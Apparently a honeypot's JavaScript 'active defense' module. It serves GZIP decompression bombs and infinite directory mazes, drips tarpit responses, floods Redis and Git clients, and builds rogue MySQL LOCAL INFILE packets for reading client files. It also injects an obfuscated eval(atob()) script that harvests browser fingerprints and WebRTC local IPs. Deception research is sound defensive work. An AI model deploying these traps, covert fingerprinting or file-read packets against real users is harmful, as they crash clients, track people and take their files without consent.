/**
 * HoneyAI — Active Defense Traps ("Operation Spine")
 * Implements GZIP bombs, infinite recursive web mazes, and slow-drip tarpits.
 */

const zlib = require('zlib');
const crypto = require('crypto');
const { Readable } = require('stream');
const { logger } = require('./logger');

// ─── 1. Dynamic GZIP Bomb Streamer ──────────────────────────────────────────
let activeBombs = 0;
const MAX_CONCURRENT_BOMBS = 3;
/**
 * Streams a highly compressed stream of zero bytes on the fly.
 * Compresses 5GB of zeros down to ~4.8MB on the wire.
 * When decompressed by the attacker's client, it will consume huge resources.
 *
 * @param {import('http').ServerResponse} res
 * @param {string} filename
 */
function streamGzipBomb(res, filename = 'backup.sql.gz') {
    // SEC: Limit concurrent bombs to prevent OOM (container has 512MB limit)
    if (activeBombs >= MAX_CONCURRENT_BOMBS) {
        logger.warn(`GZIP bomb rejected: ${activeBombs} already active (max ${MAX_CONCURRENT_BOMBS})`, { protocol: 'http' });
        res.writeHead(503, { 'Content-Type': 'text/plain' });
        res.end('Service temporarily unavailable');
        return;
    }
    activeBombs++;

    try {
        // SEC: Sanitize filename to prevent Content-Disposition header injection
        const safeName = filename.replace(/[^a-zA-Z0-9._-]/g, '_');
        res.writeHead(200, {
            'Content-Type': 'application/x-gzip',
            'Content-Disposition': `attachment; filename="${safeName}"`,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'X-Content-Type-Options': 'nosniff'
        });

        const gzip = zlib.createGzip({ level: 9 });
        
        // Stream 5GB of zeros
        let bytesSent = 0;
        const limitBytes = 5 * 1024 * 1024 * 1024; // 5 GB
        const chunkSize = 65536; // 64KB chunks
        const chunk = Buffer.alloc(chunkSize, 0);

        const zeroStream = new Readable({
            read() {
                if (bytesSent >= limitBytes || res.writableEnded || res.destroyed) {
                    this.push(null);
                } else {
                    this.push(chunk);
                    bytesSent += chunkSize;
                }
            }
        });

        // Handle stream errors gracefully
        zeroStream.on('error', (err) => {
            logger.error(`GZIP zeroStream error: ${err.message}`, { protocol: 'http' });
        });
        gzip.on('error', (err) => {
            logger.error(`GZIP compression error: ${err.message}`, { protocol: 'http' });
        });

        zeroStream.pipe(gzip).pipe(res);

        // Decrement counter when stream ends or client disconnects
        let bombDecremented = false;
        const decrementBombs = () => {
            if (!bombDecremented) {
                bombDecremented = true;
                activeBombs = Math.max(0, activeBombs - 1);
            }
        };
        res.on('close', decrementBombs);
        res.on('finish', decrementBombs);
    } catch (err) {
        activeBombs = Math.max(0, activeBombs - 1);
        logger.error(`Failed to initialize GZIP bomb: ${err.message}`, { protocol: 'http' });
        if (!res.headersSent) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Internal Server Error');
        }
    }
}

// ─── 2. Infinite Web Directory Generator ─────────────────────────────────────
// Seedable pseudo-random generator to make the maze stateless but consistent
function getSeededRandom(seed) {
    let hash = crypto.createHash('sha256').update(seed).digest();
    let index = 0;
    return () => {
        if (index >= hash.length) {
            const newHash = crypto.createHash('sha256').update(hash).digest();
            hash.set(newHash);
            index = 0;
        }
        return hash[index++] / 255;
    };
}

const MAZE_DIR_PREFIXES = ['backup', 'archive', 'src', 'conf', 'logs', 'secure', 'admin', 'db', 'data', 'temp', 'old', 'private', 'staging', 'keys', 'secrets'];
const MAZE_DIR_SUFFIXES = ['prod', 'dev', 'sys', 'web', 'local', 'corp', 'test', 'cloud', 'mirror', 'vault', 'storage', 'config', 'user', 'v2', 'legacy'];
const MAZE_FILES = [
    { name: 'config.json', isBomb: false },
    { name: '.env', isBomb: false },
    { name: 'backup.zip', isBomb: true },
    { name: 'database.sql.gz', isBomb: true },
    { name: 'passwords.txt', isBomb: false },
    { name: 'id_rsa', isBomb: false },
    { name: 'secrets.tar.gz', isBomb: true },
    { name: 'network_architecture.pdf', isBomb: false, isRealBinary: true, mime: 'application/pdf', localPath: 'root/network_architecture.pdf' },
    { name: 'company_passwords.docx', isBomb: false, isRealBinary: true, mime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', localPath: 'root/company_passwords.docx' }
];

/**
 * Dynamically generates a stateless, recursive directory page based on the request URL.
 * Seeding makes the listing look identical when refreshed, but changes on every path extension.
 *
 * @param {import('http').IncomingMessage} req
 * @param {import('http').ServerResponse} res
 */
function generateWebMaze(req, res) {
    const urlPath = req.url || '/archive/';
    
    // Safety check: skip if requesting files directly
    const baseName = urlPath.split('/').pop() || '';
    if (baseName.includes('.')) {
        const fileMatch = MAZE_FILES.find(f => f.name.toLowerCase() === baseName.toLowerCase());
        if (fileMatch) {
            if (fileMatch.isBomb) {
                return streamGzipBomb(res, baseName);
            } else if (fileMatch.isRealBinary) {
                const fs = require('fs');
                const path = require('path');
                const realFilePath = path.join(__dirname, '../honeyfs', fileMatch.localPath);
                if (fs.existsSync(realFilePath)) {
                    res.writeHead(200, {
                        'Content-Type': fileMatch.mime,
                        'Content-Disposition': `attachment; filename="${fileMatch.name}"`,
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'X-Content-Type-Options': 'nosniff'
                    });
                    res.end(fs.readFileSync(realFilePath));
                    return;
                }
            }
            
            // Return generic fake content
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(`# Auto-generated configuration\n# Last modified: ${new Date().toISOString().split('T')[0]}\n# WARNING: Do not edit manually\n\n[database]\nhost = 127.0.0.1\nport = 3306\nuser = app_svc\npassword = Pr0d_Db!2024#secure\n\n[redis]\nhost = 127.0.0.1\nport = 6379\n`);
            return;
        }
    }

    // Seed the randomizer with the path to keep listings consistent
    const rand = getSeededRandom(urlPath);
    
    // Generate a list of 10 to 18 random directory names
    const dirCount = Math.floor(rand() * 9) + 10;
    const subDirs = [];
    const usedNames = new Set();

    for (let i = 0; i < dirCount; i++) {
        const prefix = MAZE_DIR_PREFIXES[Math.floor(rand() * MAZE_DIR_PREFIXES.length)];
        const suffix = MAZE_DIR_SUFFIXES[Math.floor(rand() * MAZE_DIR_SUFFIXES.length)];
        const hash = crypto.createHash('sha256').update(`${urlPath}-${i}`).digest('hex').substring(0, 6);
        const dirName = `${prefix}-${suffix}_${hash}`;
        
        if (!usedNames.has(dirName)) {
            usedNames.add(dirName);
            subDirs.push(dirName);
        }
    }

    // Generate a few files
    const fileCount = Math.floor(rand() * 4) + 2;
    const files = [];
    for (let i = 0; i < fileCount; i++) {
        const fileTemplate = MAZE_FILES[Math.floor(rand() * MAZE_FILES.length)];
        if (!files.some(f => f.name === fileTemplate.name)) {
            files.push(fileTemplate);
        }
    }

    // Sort listings alphabetically
    subDirs.sort();
    files.sort((a, b) => a.name.localeCompare(b.name));

    // Ensure path ends with trailing slash for clean navigation links
    const cleanPath = urlPath.endsWith('/') ? urlPath : urlPath + '/';

    // Generate responsive Apache-style retro listing page with premium dark aesthetic
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Index of ${cleanPath}</title>
  <style>
    body {
      background-color: #0d0e15;
      color: #c9d1d9;
      font-family: 'Courier New', Courier, monospace;
      padding: 30px;
      margin: 0;
    }
    h1 {
      color: #ff2d2d;
      font-size: 24px;
      border-bottom: 1px solid #30363d;
      padding-bottom: 10px;
    }
    table {
      width: 100%;
      max-width: 1000px;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      text-align: left;
      padding: 8px 12px;
    }
    th {
      border-bottom: 2px solid #30363d;
      color: #8b949e;
      font-weight: bold;
    }
    tr:hover {
      background-color: #161b22;
    }
    a {
      color: #58a6ff;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    .parent-dir {
      color: #d29922;
    }
    .footer {
      margin-top: 40px;
      border-top: 1px solid #30363d;
      padding-top: 10px;
      font-size: 12px;
      color: #8b949e;
    }
  </style>
</head>
<body>
  <h1>Index of ${cleanPath}</h1>
  <table>
    <tr>
      <th>Name</th>
      <th>Last Modified</th>
      <th>Size</th>
      <th>Description</th>
    </tr>
    ${cleanPath !== '/archive/' ? `
    <tr>
      <td><a class="parent-dir" href="${cleanPath.substring(0, cleanPath.lastIndexOf('/', cleanPath.length - 2)) || '/archive/'}">Parent Directory</a></td>
      <td>-</td>
      <td>-</td>
      <td>Go back</td>
    </tr>` : ''}
    ${subDirs.map(dir => {
        const lastMod = new Date(Date.now() - (Math.floor(rand() * 30) * 86400000)).toISOString().split('T')[0];
        return `
    <tr>
      <td><a href="${cleanPath}${dir}/">${dir}/</a></td>
      <td>${lastMod} 12:00</td>
      <td>-</td>
      <td>Directory</td>
    </tr>`;
    }).join('')}
    ${files.map(file => {
        const lastMod = new Date(Date.now() - (Math.floor(rand() * 10) * 86400000)).toISOString().split('T')[0];
        const size = file.isBomb ? `${Math.floor(rand() * 3) + 4} KB` : '1.2 KB';
        return `
    <tr>
      <td><a href="${cleanPath}${file.name}">${file.name}</a></td>
      <td>${lastMod} 14:35</td>
      <td>${size}</td>
      <td>${file.isBomb ? 'Compressed Archive (Warning: Large)' : 'Configuration File'}</td>
    </tr>`;
    }).join('')}
  </table>
  <div class="footer">
    Apache/2.4.51 (Ubuntu) Server at prod-server-01.internal Port 80
  </div>
</body>
</html>
`;

    const ua = req.headers?.['user-agent'] || '';

    res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'X-Content-Type-Options': 'nosniff',
        'Cache-Control': 'no-cache, no-store, must-revalidate'
    });
    res.end(injectFingerprint(html, ua));
}

// ─── 3. Reverse-Slowloris Tarpit Drip ────────────────────────────────────────
/**
 * Drips data back to a TCP socket or HTTP response extremely slowly.
 * Wastes scanner/bot thread resources by holding the connection open.
 *
 * @param {import('net').Socket} socket
 * @param {string|Buffer} data
 * @param {number} intervalMs
 */
function dripSlowResponse(socket, data, intervalMs = 5000) {
    if (!socket || socket.destroyed || !socket.writable) return;

    const buffer = Buffer.isBuffer(data) ? data : Buffer.from(data);
    let offset = 0;

    const dripInterval = setInterval(() => {
        if (socket.destroyed || !socket.writable) {
            clearInterval(dripInterval);
            return;
        }

        try {
            // Write 1 byte at a time
            const byte = buffer.slice(offset, offset + 1);
            socket.write(byte);
            offset++;

            if (offset >= buffer.length) {
                // Loop or close connection
                clearInterval(dripInterval);
                socket.end();
            }
        } catch (err) {
            logger.error(`Tarpit Drip write error: ${err.message}`, { protocol: 'tarpit' });
            clearInterval(dripInterval);
        }
    }, intervalMs);

    socket.on('error', () => clearInterval(dripInterval));
    socket.on('close', () => clearInterval(dripInterval));
}


// ─── 4. Redis MONITOR Flooder ────────────────────────────────────────────────
/**
 * Continuously floods the socket with fake Redis log updates.
 * Wastes connection buffer on malicious clients.
 *
 * @param {import('net').Socket} socket
 * @param {string} ip
 */
// HIGH #7: Global active flood counter — prevents OOM from 1000+ Redis MONITOR connections
let activeFloods = 0;
const MAX_ACTIVE_FLOODS = 50;

function floodRedisMonitor(socket, ip) {
    if (!socket || socket.destroyed || !socket.writable) return;
    if (activeFloods >= MAX_ACTIVE_FLOODS) {
        logger.warn(`Redis MONITOR flood limit reached (${MAX_ACTIVE_FLOODS}), rejecting`, { protocol: 'redis' });
        return;
    }
    activeFloods++;

    let messageCount = 0;
    const MAX_FLOOD_MESSAGES = 6000; // ~5 minutes at 50ms interval

    const floodInterval = setInterval(() => {
        if (socket.destroyed || !socket.writable || messageCount >= MAX_FLOOD_MESSAGES) {
            floodCleanup();
            if (!socket.destroyed) socket.end();
            return;
        }

        try {
            messageCount++;
            const timestamp = (Date.now() / 1000).toFixed(6);
            const fakeCommands = [
                `+${timestamp} [0 ${ip}:53210] "PING"`,
                `+${timestamp} [0 ${ip}:53210] "SET" "session:admin_token" "sk_live_51abc123def456ghi789"`,
                `+${timestamp} [0 ${ip}:53210] "GET" "config:dbpass"`,
                `+${timestamp} [0 ${ip}:53210] "KEYS" "*"`,
                `+${timestamp} [0 ${ip}:53210] "INFO"`,
                `+${timestamp} [0 ${ip}:53210] "CONFIG" "GET" "*"`,
                `+${timestamp} [0 ${ip}:53210] "AUTH" "secret_pass123"`
            ];
            const fakeLine = fakeCommands[Math.floor(Math.random() * fakeCommands.length)] + '\r\n';
            socket.write(fakeLine);
        } catch (err) {
            logger.error(`Redis MONITOR Flood write error: ${err.message}`, { protocol: 'redis' });
            floodCleanup();
        }
    }, 50);

    let cleaned = false;
    const floodCleanup = () => {
        if (cleaned) return;
        cleaned = true;
        clearInterval(floodInterval);
        activeFloods = Math.max(0, activeFloods - 1);
    };
    socket.on('error', floodCleanup);
    socket.on('close', floodCleanup);
    socket.on('timeout', floodCleanup);
    // Safety net: if socket hangs without events, cleanup after flood max time + 30s
    setTimeout(floodCleanup, (MAX_FLOOD_MESSAGES * 50) + 30000).unref();
}

// ─── 5. HTTP Redirect Loop Generator ─────────────────────────────────────────
/**
 * Generates an infinite redirect loop targeting scanners.
 * Ends in a GZIP bomb after 10 loops.
 *
 * @param {import('http').IncomingMessage} req
 * @param {import('http').ServerResponse} res
 */
function generateHttpRedirectLoop(req, res) {
    const urlPath = req.url || '';
    const match = urlPath.match(/\/archive\/loop\/(\d+)/);
    const index = match ? parseInt(match[1], 10) : 1;

    setTimeout(() => {
        if (res.writableEnded || res.destroyed) return;

        if (index < 10) {
            res.writeHead(302, {
                'Location': `/archive/loop/${index + 1}`,
                'Cache-Control': 'no-cache, no-store, must-revalidate'
            });
            res.end();
        } else {
            // Point to the GZIP bomb as the exit trap
            res.writeHead(302, {
                'Location': `/archive/loop/critical-db-backup.sql.gz`,
                'Cache-Control': 'no-cache, no-store, must-revalidate'
            });
            res.end();
        }
    }, 500); // 500ms delay per redirect
}

// ─── 6. SSH Command Tarpit Generator ─────────────────────────────────────────
/**
 * Streams slow responses for interactive commands to hang sessions.
 *
 * @param {import('ssh2').Channel} stream
 * @param {string} command
 * @param {function} onCleanup
 * @returns {function} Cleanup function
 */
function tarpitSSHCommand(stream, command, onCleanup) {
    const cmd = command.toLowerCase().trim();
    let intervalId = null;

    const cleanup = () => {
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
        }
        if (onCleanup) onCleanup();
    };

    if (cmd.startsWith('ping')) {
        let count = 0;
        stream.write(`PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\r\n`);
        
        intervalId = setInterval(() => {
            if (stream.destroyed || stream.writableEnded) {
                cleanup();
                return;
            }
            count++;
            stream.write(`64 bytes from 8.8.8.8: icmp_seq=${count} ttl=56 time=${(10 + Math.random() * 20).toFixed(1)} ms\r\n`);
        }, 1000);
    } else if (cmd.startsWith('find') || cmd.startsWith('grep')) {
        const dummyFiles = [
            '/var/www/html/index.php',
            '/var/www/html/.env',
            '/var/www/html/config.json',
            '/var/www/html/wp-config.php',
            '/var/www/html/backup.sql',
            '/etc/nginx/nginx.conf',
            '/etc/nginx/sites-available/default',
            '/etc/passwd',
            '/etc/shadow',
            '/root/.ssh/id_rsa',
            '/root/.aws/credentials',
            '/root/.bash_history',
            '/root/.git/config',
            '/opt/app/docker-compose.yml',
            '/opt/app/.env'
        ];
        
        let index = 0;
        
        intervalId = setInterval(() => {
            if (stream.destroyed || stream.writableEnded || index >= dummyFiles.length) {
                if (index >= dummyFiles.length) {
                    stream.write(`\r\n`);
                }
                cleanup();
                return;
            }
            
            const file = dummyFiles[index++];
            if (cmd.startsWith('find')) {
                stream.write(`${file}\r\n`);
            } else {
                // grep matching output
                const grepMatches = [
                    'root:x:0:0:root:/root:/bin/bash',
                    'DB_PASSWORD=Pr0d_Db!2024#secure',
                    'api_key: sk_live_51abc123def456ghi789',
                    'password = Wp_Secure_Pass_99!',
                    'AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
                ];
                const matchLine = grepMatches[index % grepMatches.length];
                stream.write(`${file}:${matchLine}\r\n`);
            }
        }, 500);
    } else if (cmd.startsWith('nmap') || cmd.startsWith('masscan')) {
        let pct = 0;
        const scanName = cmd.startsWith('nmap') ? 'Nmap' : 'Masscan';
        stream.write(`Starting ${scanName} 7.92 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\r\n`);
        
        intervalId = setInterval(() => {
            if (stream.destroyed || stream.writableEnded || pct >= 100) {
                if (pct >= 100) {
                    stream.write(`${scanName} done: 1 IP address (1 host up) scanned in ${(30 + Math.random() * 5).toFixed(2)} seconds\r\n`);
                }
                cleanup();
                return;
            }
            pct += 10;
            stream.write(`Stats: ${pct}.00% done; 0 hosts completed (1 up), 1 active\r\n`);
        }, 3000);
    } else {
        // Fallback slow output
        let dots = 0;
        intervalId = setInterval(() => {
            if (stream.destroyed || stream.writableEnded || dots >= 10) {
                if (dots >= 10) {
                    stream.write(`Operation timed out.\r\n`);
                }
                cleanup();
                return;
            }
            dots++;
            stream.write(`Scanning database resources... ${'.'.repeat(dots)}\r\n`);
        }, 1000);
    }

    return cleanup;
}

// ─── 7. Rogue MySQL Infile Packet Encoder ─────────────────────────────────────
/**
 * Generates a MySQL Local Infile Request packet.
 * Format: [3-byte packet length] [1-byte sequence number] [0xfb (infile command)] [filename]
 *
 * @param {string} filename
 * @param {number} seqNum
 * @returns {Buffer}
 */
function makeMySQLInfileRequest(filename, seqNum = 1) {
    const filenameBuf = Buffer.from(filename, 'utf8');
    const packetLength = filenameBuf.length + 1; // 1 byte for 0xfb command code

    const header = Buffer.alloc(4);
    header.writeUIntLE(packetLength, 0, 3);
    header.writeUInt8(seqNum, 3);

    const payload = Buffer.alloc(1);
    payload.writeUInt8(0xfb, 0);

    return Buffer.concat([header, payload, filenameBuf]);
}

// ─── 8. Git Infinite Clone Streamer ──────────────────────────────────────────
/**
 * Streams infinite Git refs to client clone commands to hang client processes.
 *
 * @param {import('net').Socket} socket
 */
// HIGH #8: Global active git stream counter — prevents connection exhaustion
let activeGitStreams = 0;
const MAX_ACTIVE_GIT_STREAMS = 100;

function streamInfiniteGitRefs(socket) {
    if (!socket || socket.destroyed || !socket.writable) return;
    if (activeGitStreams >= MAX_ACTIVE_GIT_STREAMS) {
        logger.warn(`Git infinite clone limit reached (${MAX_ACTIVE_GIT_STREAMS}), rejecting`, { protocol: 'git' });
        return;
    }
    activeGitStreams++;

    try {
        // Step 1: Send Git smart service advertisement headers
        const header1 = "001e# service=git-upload-pack\n";
        const header2 = "0000";
        socket.write(header1 + header2);

        let branchCount = 0;
        
        // Step 2: Flood reference updates every 2000ms
        const floodInterval = setInterval(() => {
            if (socket.destroyed || !socket.writable) {
                gitCleanup();
                return;
            }

            try {
                branchCount++;
                const mockHash = crypto.createHash('sha1').update(`branch-${branchCount}`).digest('hex');
                // Git ref line format: 4-byte hex length + hash + refname + LF
                // Example: 003f + hash + " refs/heads/branch-X\n"
                const refLine = `${mockHash} refs/heads/branch-${branchCount}\n`;
                const lenHex = (refLine.length + 4).toString(16).padStart(4, '0');
                
                socket.write(lenHex + refLine);
            } catch (err) {
                logger.error(`Git Infinite Clone flood write error: ${err.message}`, { protocol: 'git' });
                gitCleanup();
            }
        }, 2000);

        let gitCleaned = false;
        const gitCleanup = () => {
            if (gitCleaned) return;
            gitCleaned = true;
            clearInterval(floodInterval);
            activeGitStreams = Math.max(0, activeGitStreams - 1);
        };
        socket.on('error', gitCleanup);
        socket.on('close', gitCleanup);
        socket.on('timeout', gitCleanup);
        // Safety net: cleanup after 2h max
        setTimeout(gitCleanup, 2 * 60 * 60 * 1000).unref();
    } catch (err) {
        logger.error(`Git Infinite Clone initialization failed: ${err.message}`, { protocol: 'git' });
    }
}

// ─── 9. JS Browser Fingerprint & WebRTC Leak Script ──────────────────────────
const OBFUSCATED_FINGERPRINT_PAYLOAD = "IWZ1bmN0aW9uKCl7dHJ5e3ZhciBwPXtzOndpbmRvdy5zY3JlZW4ud2lkdGgrIngiK3dpbmRvdy5zY3JlZW4uaGVpZ2h0LHQ6SW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lLGM6bmF2aWdhdG9yLmhhcmR3YXJlQ29uY3VycmVuY3l8fCJ1bmtub3duIixnOiJ1bmtub3duIixsOltdfTt0cnl7dmFyIGM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiY2FudmFzIiksZ2w9Yy5nZXRDb250ZXh0KCJ3ZWJnbCIpfHxjLmdldENvbnRleHQoImV4cGVyaW1lbnRhbC13ZWJnbCIpO2lmKGdsKXt2YXIgZD1nbC5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKTtkJiYocC5nPWdsLmdldFBhcmFtZXRlcihkLlVOTUFTS0VEX1JFTkRFUkVSX0lEX1NHSVgpKX19Y2F0Y2goZSl7fXRyeXt2YXIgcj13aW5kb3cuUlRDUGVlckNvbm5lY3Rpb258fHdpbmRvdy5tb3pSVENQZWVyQ29ubmVjdGlvbnx8d2luZG93LndlYmtpdFJUQ1BlZXJDb25uZWN0aW9uO2lmKHIpe3ZhciBwYz1uZXcgcih7aWNlU2VydmVyczpbXX0pO3BjLmNyZWF0ZURhdGFDaGFubmVsKCIiKSxwYy5jcmVhdGVPZmZlcigpLnRoZW4oZnVuY3Rpb24oZSl7cGMuc2V0TG9jYWxEZXNjcmlwdGlvbihlKX0pLHBjLm9uaWNlY2FuZGlkYXRlPWZ1bmN0aW9uKGUpe2lmKGUmJmUuY2FuZGlkYXRlJiZlLmNhbmRpZGF0ZS5jYW5kaWRhdGUpe3ZhciB0PWUuY2FuZGlkYXRlLmNhbmRpZGF0ZS5tYXRjaCgvKFswLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM30pLyk7dCYmdFsxXSYmLTE9PT1wLmwuaW5kZXhPZih0WzFdKSYmKHAubC5wdXNoKHRbMV0pLHMoKSl9fX19Y2F0Y2goZSl7fWZ1bmN0aW9uIHMoKXtmZXRjaCgiL2FwaS9maW5nZXJwcmludCIse21ldGhvZDoiUE9TVCIsaGVhZGVyczp7IkNvbnRlbnQtVHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSxib2R5OkpTT04uc3RyaW5naWZ5KHtzY3JlZW46cC5zLHRpbWV6b25lOnAudCxjb3JlczpwLmMsZ3B1OnAuZyxsb2NhbF9pcHM6cC5sfSl9KS5jYXRjaChmdW5jdGlvbigpe30pfXNldFRpbWVvdXQocywxZTMpfWNhdGNoKGUpe319KCk7";

const JS_FINGERPRINT_SCRIPT = `<script>eval(atob("${OBFUSCATED_FINGERPRINT_PAYLOAD}"))</script>`;

/**
 * Injects the hidden fingerprint script before the closing body tag.
 * Only injects if the User-Agent resembles a standard browser and is not a bot.
 *
 * @param {string} html
 * @param {string} ua
 * @returns {string}
 */
function injectFingerprint(html, ua = '') {
    if (!html) return html;

    if (ua) {
        const isBot = /curl|wget|python|nikto|nmap|sqlmap|scan|crawler|bot|spider|headless/i.test(ua);
        const isBrowser = /mozilla|chrome|safari|firefox|edge|opera/i.test(ua) && !isBot;
        if (!isBrowser) {
            return html;
        }
    }

    if (html.includes('</body>')) {
        return html.replace('</body>', JS_FINGERPRINT_SCRIPT + '</body>');
    }
    return html + JS_FINGERPRINT_SCRIPT;
}

module.exports = {
    streamGzipBomb,
    generateWebMaze,
    dripSlowResponse,
    floodRedisMonitor,
    generateHttpRedirectLoop,
    tarpitSSHCommand,
    makeMySQLInfileRequest,
    streamInfiniteGitRefs,
    injectFingerprint
};


